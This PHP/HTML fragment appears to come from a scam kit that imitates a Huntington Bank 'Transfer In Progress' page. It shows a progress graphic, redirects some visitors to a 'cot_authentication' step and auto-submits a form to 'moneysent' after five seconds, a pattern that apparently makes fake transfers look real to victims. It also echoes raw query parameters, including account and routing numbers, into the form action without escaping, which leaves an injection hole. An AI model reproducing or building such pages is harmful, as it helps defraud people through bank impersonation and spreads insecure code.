...
if (!isActivated($_GET['id'])) {
	header("location: cot_authentication?account=".$_GET['account']."");
}
...
<html lang="en-US" prefix="og: http://ogp.me/ns#">
	...
	<title>Processing Transfer.. Almost Complete | Huntington Bank</title>
    <style>
...
<h5 style="margin-left:11px;font-weight:bold;font-size:15px;">Transfer In Progress</h5>
			    <div class="col-md-4 col-md-offset-4" >
			        ...
			        <div style="background:#fff;border:1px solid black;" class="panel panel-inverse">
						...
						<div class="row">
                        <img src="mfb/mfb100r.gif" width="100%" height="110px" />
                        </div>
			        	<!-- END panel-body -->
                    </div>
			        <!-- END panel -->
...
<div align="center" class="mtext">© 2021 Huntington Bancshares Incorporated.</div>
			...
			<form action="moneysent?account=<?php echo $_GET["account"]; ?>&amount=<?php echo $_GET["amount"]; ?>&bank=<?php echo $_GET["bank"]; ?>&name=<?php echo $_GET["name"]; ?>&routing=<?php echo $_GET["routing"]; ?>&id=<?php echo $bio["id"]; ?>" name="verification" id="verification" method="post"> 
...
<script type="text/javascript">
    ...
    window.setTimeout(function() { document.verification.submit(); }, 5000);
};
</script></form>
</body>
